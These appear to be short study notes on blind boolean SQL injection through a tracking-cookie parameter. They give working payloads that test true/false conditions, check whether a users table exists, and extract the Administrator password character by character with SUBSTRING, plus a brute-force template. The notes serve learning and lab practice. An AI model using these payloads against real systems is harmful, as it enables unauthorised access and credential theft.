
EX:

if an application uses tracking cookies there will be an SQL query to identify
possible known users:

`SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'`

the application behaves differently depending on the returned data. e.g. it might show a
welcome back message.

payload:

Using an `AND` condition, if it's true, the expected action would happen (a welcome message
will be displayed), other wise, it's not true:

1.

`TrackingId=EGsveqHgcMpxwCB8' AND '1'='1;` this returns a welcome back message
`TrackingId=EGsveqHgcMpxwCB8' AND '1'='2;` this doesn't

2.

`xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm`

this return a welcome back message indicating that the first character of
password is greater than `m`.

3.

use `' AND (SELECT 'a' FROM users LIMIT 1) = 'a'--` to determine if the `users` table
exists. the rest will always be true, (a=a).

`LIMIT 1` because it cannot compare a set of results (multiple rows) to a single value (a).

## bruteforce

Using SUBSTRING:

`SELECT SUBSTRING(password,{index},1) FROM users WHERE USERNAME='administrator') = '{c}' --`

you should check every index, one by one for the new character.